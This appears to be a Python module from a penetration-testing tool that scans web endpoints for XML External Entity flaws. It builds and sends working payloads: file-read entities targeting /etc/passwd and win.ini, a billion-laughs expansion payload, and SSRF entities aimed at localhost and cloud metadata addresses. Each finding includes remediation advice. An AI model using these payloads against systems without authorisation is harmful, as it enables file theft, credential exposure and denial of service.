"""
XXE (XML External Entity) Scanner

Detects XML External Entity injection vulnerabilities allowing file disclosure and SSRF.
"""
import asyncio
import logging
import re
from typing import List, Optional, Callable, Dict, Set
from urllib.parse import urlparse
from app.models import Vulnerability, SeverityLevel, VulnerabilityCategory
from app.utils import PentestHTTPClient

logger = logging.getLogger(__name__)

class XXEScanner:
    """
    Scanner for XML External Entity (XXE) vulnerabilities

    Tests for:
    - Classic XXE (file disclosure)
    - Billion Laughs Attack (DoS)
    - SSRF via XXE
    - Parameter Entity XXE
    - XML injection in API endpoints
    """

    # Content types that might accept XML
    XML_CONTENT_TYPES = [
        'application/xml',
        'text/xml',
        'application/soap+xml',
        'application/xhtml+xml',
        'application/rss+xml',
        'application/atom+xml',
    ]

    # Indicators of XXE success
    XXE_SIGNATURES = [
        # /etc/passwd content
        b'root:',
        b'/bin/bash',
        b'/bin/sh',
        b'daemon:',
        b'nobody:',
        # Windows files
        b'[fonts]',
        b'[extensions]',
        b'[boot loader]',
        # Other indicators
        b'<?xml',
        b'<!DOCTYPE',
    ]

    # Test files for XXE
    TEST_FILES = [
        '/etc/passwd',
        '/etc/hosts',
        '/etc/hostname',
        'C:\\Windows\\win.ini',
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',
    ]

    def __init__(
        self,
        client: PentestHTTPClient,
        scan_depth: str = "balanced",
        progress_callback: Optional[Callable] = None
    ):
        self.client = client
        self.scan_depth = scan_depth
        self.progress_callback = progress_callback
        self.tested_endpoints: Set[str] = set()

    async def scan(self, endpoints: Optional[List[str]] = None) -> List[Vulnerability]:
        """
        Scan for XXE vulnerabilities

        Args:
            endpoints: List of discovered endpoints (optional)

        Returns:
            List of XXE vulnerabilities found
        """
        vulnerabilities = []

        logger.info("🔥 XXE Scanner started")

        if not endpoints:
            endpoints = [self.client.base_url]

        # Find endpoints that might accept XML
        xml_endpoints = self._find_xml_endpoints(endpoints)

        # Determine test depth
        max_endpoints = {
            'quick': 5,
            'balanced': 15,
            'deep': 50
        }.get(self.scan_depth, 15)

        xml_endpoints = xml_endpoints[:max_endpoints]

        logger.info(f"Testing {len(xml_endpoints)} endpoints for XXE ({self.scan_depth} mode)")

        # Test each endpoint
        for i, endpoint in enumerate(xml_endpoints):
            if self.progress_callback:
                await self.progress_callback(
                    f"XXE: Testing endpoint {i+1}/{len(xml_endpoints)}: {endpoint}"
                )

            # Test classic XXE (file disclosure)
            vulns = await self._test_classic_xxe(endpoint)
            vulnerabilities.extend(vulns)

            # Test billion laughs (DoS)
            if self.scan_depth in ['balanced', 'deep']:
                vulns = await self._test_billion_laughs(endpoint)
                vulnerabilities.extend(vulns)

            # Test SSRF via XXE
            if self.scan_depth == 'deep':
                vulns = await self._test_xxe_ssrf(endpoint)
                vulnerabilities.extend(vulns)

            await asyncio.sleep(0.1)  # Rate limiting

        logger.info(f"✅ XXE scan complete: {len(vulnerabilities)} issues found")
        return vulnerabilities

    def _find_xml_endpoints(self, endpoints: List[str]) -> List[str]:
        """Find endpoints that might accept XML input"""
        xml_endpoints = []

        for endpoint in endpoints:
            # API endpoints (likely to accept XML)
            if any(pattern in endpoint.lower() for pattern in [
                '/api/', '/rest/', '/soap/', '/ws/', '/service/',
                '/xml', '/rss', '/feed', '/atom'
            ]):
                xml_endpoints.append(endpoint)

            # Endpoints that returned XML
            # (we'd need to check response content-type, but we can try anyway)
            elif endpoint.endswith('.xml'):
                xml_endpoints.append(endpoint)

        # If no XML endpoints found, test common API patterns
        if not xml_endpoints:
            base_url = self.client.base_url
            common_patterns = [
                f"{base_url}/api/",
                f"{base_url}/api/v1/",
                f"{base_url}/api/users",
                f"{base_url}/rest/",
                f"{base_url}/soap/",
                f"{base_url}/xml/",
            ]
            xml_endpoints.extend(common_patterns)

        return xml_endpoints

    async def _test_classic_xxe(self, endpoint: str) -> List[Vulnerability]:
        """
        Test for classic XXE (file disclosure)

        Attempts to read sensitive files via external entity
        """
        vulnerabilities = []

        if endpoint in self.tested_endpoints:
            return vulnerabilities
        self.tested_endpoints.add(endpoint)

        # Test multiple file targets
        test_files = self.TEST_FILES[:3] if self.scan_depth == 'quick' else self.TEST_FILES

        for target_file in test_files:
            # Generate XXE payload
            payload = self._generate_xxe_payload(target_file)

            try:
                # Send XML with XXE payload
                response = await self.client.post(
                    endpoint,
                    data=payload,
                    headers={'Content-Type': 'application/xml'}
                )

                if not response:
                    continue

                # Check if file content is in response
                if self._is_xxe_successful(response.text, response.content, target_file):
                    vulnerabilities.append(Vulnerability(
                        id=f"xxe_classic_{hash(endpoint)}_{hash(target_file)}",
                        title="XML External Entity (XXE) Injection - File Disclosure",
                        description="XXE vulnerability allows reading arbitrary files from the server. "
                                  "The application parses XML input without disabling external entities, "
                                  "allowing attackers to access sensitive files.",
                        severity=SeverityLevel.CRITICAL,
                        category=VulnerabilityCategory.XXE,
                        affected_url=endpoint,
                        proof_of_concept=f"Successfully exploited XXE to read file: {target_file}\\n\\n"
                                       f"Request:\\n"
                                       f"POST {endpoint} HTTP/1.1\\n"
                                       f"Content-Type: application/xml\\n\\n"
                                       f"{payload[:500]}...\\n\\n"
                                       f"The server response contained file content from {target_file}, "
                                       f"confirming XXE vulnerability.",
                        payload=payload[:1000],  # Truncate for display
                        remediation="**Critical: XXE Remediation**\\n\\n"
                                  "1. **Disable External Entities (REQUIRED)**\\n\\n"
                                  "Python (lxml):\\n"
                                  "```python\\n"
                                  "from lxml import etree\\n\\n"
                                  "# Secure parser\\n"
                                  "parser = etree.XMLParser(\\n"
                                  "    resolve_entities=False,  # Disable entity resolution\\n"
                                  "    no_network=True,         # Disable network access\\n"
                                  "    dtd_validation=False     # Disable DTD validation\\n"
                                  ")\\n"
                                  "tree = etree.fromstring(xml_data, parser)\\n"
                                  "```\\n\\n"
                                  "Python (xml.etree):\\n"
                                  "```python\\n"
                                  "import defusedxml.ElementTree as ET\\n\\n"
                                  "# Use defusedxml instead of xml.etree\\n"
                                  "tree = ET.parse(xml_file)\\n"
                                  "```\\n\\n"
                                  "Java:\\n"
                                  "```java\\n"
                                  "DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\\n"
                                  "// Disable external entities\\n"
                                  "dbf.setFeature(\\\"http://apache.org/xml/features/disallow-doctype-decl\\\", true);\\n"
                                  "dbf.setFeature(\\\"http://xml.org/sax/features/external-general-entities\\\", false);\\n"
                                  "dbf.setFeature(\\\"http://xml.org/sax/features/external-parameter-entities\\\", false);\\n"
                                  "dbf.setXIncludeAware(false);\\n"
                                  "dbf.setExpandEntityReferences(false);\\n"
                                  "```\\n\\n"
                                  "PHP:\\n"
                                  "```php\\n"
                                  "libxml_disable_entity_loader(true); // Disable external entities\\n"
                                  "$doc = new DOMDocument();\\n"
                                  "$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);\\n"
                                  "```\\n\\n"
                                  "Node.js:\\n"
                                  "```javascript\\n"
                                  "const libxmljs = require('libxmljs');\\n\\n"
                                  "// Secure parsing\\n"
                                  "const doc = libxmljs.parseXml(xmlString, {\\n"
                                  "    noent: false,    // Don't substitute entities\\n"
                                  "    nonet: true,     // Disable network access\\n"
                                  "    dtdload: false   // Don't load DTD\\n"
                                  "});\\n"
                                  "```\\n\\n"
                                  ".NET:\\n"
                                  "```csharp\\n"
                                  "XmlReaderSettings settings = new XmlReaderSettings();\\n"
                                  "settings.DtdProcessing = DtdProcessing.Prohibit;\\n"
                                  "settings.XmlResolver = null;\\n"
                                  "XmlReader reader = XmlReader.Create(stream, settings);\\n"
                                  "```\\n\\n"
                                  "2. **Input Validation**\\n"
                                  "   - Validate XML against strict schema (XSD)\\n"
                                  "   - Reject XML with DOCTYPE declarations\\n"
                                  "   - Use whitelist of allowed elements\\n\\n"
                                  "3. **Alternative: Use JSON**\\n"
                                  "   - Consider using JSON instead of XML (not vulnerable to XXE)\\n"
                                  "   - JSON is safer and more widely supported\\n\\n"
                                  "4. **Defense in Depth**\\n"
                                  "   - Run XML parser with minimal privileges\\n"
                                  "   - Implement file access restrictions\\n"
                                  "   - Monitor and log XML parsing operations",
                        cwe_id="CWE-611",
                        owasp_category="A05:2021 – Security Misconfiguration",
                        references=[
                            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                            "https://portswigger.net/web-security/xxe"
                        ]
                    ))
                    logger.info(f"🚨 XXE vulnerability: {endpoint} (file: {target_file})")
                    return vulnerabilities  # Found one, no need to test more files

            except Exception as e:
                logger.debug(f"Error testing XXE on {endpoint}: {e}")

        return vulnerabilities

    async def _test_billion_laughs(self, endpoint: str) -> List[Vulnerability]:
        """
        Test for Billion Laughs Attack (XML bomb / DoS)

        This is an entity expansion attack that can cause DoS
        """
        vulnerabilities = []

        # Billion Laughs payload (simplified version for testing)
        payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<data>&lol4;</data>"""

        try:
            # Send payload and measure response time
            import time
            start_time = time.time()

            response = await self.client.post(
                endpoint,
                data=payload,
                headers={'Content-Type': 'application/xml'}
            )

            response_time = time.time() - start_time

            # If response took too long or error, might be vulnerable
            if not response or response_time > 5.0 or response.status_code == 500:
                vulnerabilities.append(Vulnerability(
                    id=f"xxe_billion_laughs_{hash(endpoint)}",
                    title="XML Entity Expansion (Billion Laughs Attack)",
                    description="The application is vulnerable to XML entity expansion attacks (Billion Laughs). "
                              "This can cause Denial of Service by consuming excessive server resources.",
                    severity=SeverityLevel.HIGH,
                    category=VulnerabilityCategory.XXE,
                    affected_url=endpoint,
                    proof_of_concept=f"Sent XML entity expansion payload to {endpoint}.\\n"
                                   f"Server response time: {response_time:.2f}s (normal: <1s)\\n"
                                   f"This indicates the server is processing entity expansions, "
                                   f"which can be exploited for DoS attacks.",
                    payload=payload[:500],
                    remediation="Disable DTD processing and entity expansion:\\n\\n"
                              "Python: Use defusedxml library\\n"
                              "Java: Set DTD processing to DENY\\n"
                              "PHP: Use libxml_disable_entity_loader(true)\\n"
                              "Node.js: Disable entity expansion in parser\\n\\n"
                              "Limit XML document size and parsing time.",
                    cwe_id="CWE-776",
                    owasp_category="A05:2021 – Security Misconfiguration",
                    references=[
                        "https://en.wikipedia.org/wiki/Billion_laughs_attack",
                        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
                    ]
                ))
                logger.info(f"🚨 Billion Laughs vulnerability: {endpoint}")

        except Exception as e:
            logger.debug(f"Error testing Billion Laughs on {endpoint}: {e}")

        return vulnerabilities

    async def _test_xxe_ssrf(self, endpoint: str) -> List[Vulnerability]:
        """
        Test for SSRF via XXE

        Attempts to make the server connect to internal resources
        """
        vulnerabilities = []

        # Test internal network access
        internal_targets = [
            'http://localhost:80',
            'http://127.0.0.1:80',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP metadata
        ]

        for target in internal_targets[:2]:  # Limit tests
            # Generate XXE SSRF payload
            payload = f"""<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "{target}">
]>
<data>&xxe;</data>"""

            try:
                response = await self.client.post(
                    endpoint,
                    data=payload,
                    headers={'Content-Type': 'application/xml'}
                )

                if not response:
                    continue

                # Check for SSRF indicators
                if any(indicator in response.text.lower() for indicator in [
                    'localhost', '127.0.0.1', 'internal', 'private',
                    'metadata', 'ami-id', 'instance-id', 'credentials'
                ]):
                    vulnerabilities.append(Vulnerability(
                        id=f"xxe_ssrf_{hash(endpoint)}_{hash(target)}",
                        title="Server-Side Request Forgery (SSRF) via XXE",
                        description="XXE vulnerability allows Server-Side Request Forgery (SSRF). "
                                  "Attacker can make the server access internal resources, "
                                  "cloud metadata, or other backend systems.",
                        severity=SeverityLevel.CRITICAL,
                        category=VulnerabilityCategory.SSRF,
                        affected_url=endpoint,
                        proof_of_concept=f"XXE payload successfully triggered SSRF to: {target}\\n\\n"
                                       f"The server made a request to an internal resource, "
                                       f"and the response contained internal data. "
                                       f"This can be exploited to access:\\n"
                                       f"- Internal services (databases, APIs)\\n"
                                       f"- Cloud metadata (AWS, GCP, Azure)\\n"
                                       f"- Private network resources",
                        payload=payload[:500],
                        remediation="Disable external entity resolution (see XXE remediation). "
                                  "Additionally:\\n"
                                  "- Implement outbound request filtering\\n"
                                  "- Block access to internal IPs (127.0.0.1, 10.0.0.0/8, 192.168.0.0/16)\\n"
                                  "- Block cloud metadata endpoints\\n"
                                  "- Use network segmentation",
                        cwe_id="CWE-918",
                        owasp_category="A10:2021 – Server-Side Request Forgery (SSRF)",
                        references=[
                            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
                        ]
                    ))
                    logger.info(f"🚨 XXE SSRF vulnerability: {endpoint} → {target}")
                    return vulnerabilities  # Found SSRF, stop testing

            except Exception as e:
                logger.debug(f"Error testing XXE SSRF on {endpoint}: {e}")

        return vulnerabilities

    def _generate_xxe_payload(self, target_file: str) -> str:
        """
        Generate XXE payload for file disclosure

        Args:
            target_file: File to read

        Returns:
            XML payload with external entity
        """
        # Classic XXE payload
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<data>
  <file>&xxe;</file>
</data>"""
        return payload

    def _is_xxe_successful(self, text: str, content: bytes, target_file: str) -> bool:
        """
        Check if XXE was successful

        Args:
            text: Response text
            content: Response bytes
            target_file: Target file attempted

        Returns:
            True if XXE appears successful
        """
        # Check for file signatures
        for signature in self.XXE_SIGNATURES:
            if signature in content:
                return True

        # Check for /etc/passwd patterns
        if '/etc/passwd' in target_file:
            if re.search(rb'root:.*?:/bin/', content):
                return True
            if b'root:x:0:0:' in content:
                return True

        # Check for Windows file patterns
        if 'win.ini' in target_file:
            if b'[fonts]' in content or b'[extensions]' in content:
                return True

        # Check for error messages that reveal XXE processing
        xxe_error_patterns = [
            'entity',
            'external',
            'dtd',
            'xml parse',
            'file not found',
            'permission denied',
            '/etc/passwd',
            'c:\\windows',
        ]

        text_lower = text.lower()
        for pattern in xxe_error_patterns:
            if pattern in text_lower:
                return True

        return False
